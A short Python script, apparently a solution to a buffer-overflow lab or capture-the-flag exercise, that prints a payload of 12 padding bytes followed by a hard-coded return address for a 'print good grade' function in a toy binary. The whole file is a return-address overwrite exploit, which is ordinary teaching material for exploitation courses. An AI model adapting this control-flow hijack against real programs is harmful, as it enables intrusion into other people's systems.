#!/usr/bin/env python3

import sys

#overwritte buf and rbp
padding = b"x" * 12

# this is the address of print good grade
address = 0x0000000000401e46.to_bytes(8, 'little')

payload = padding + address

sys.stdout.buffer.write(payload)
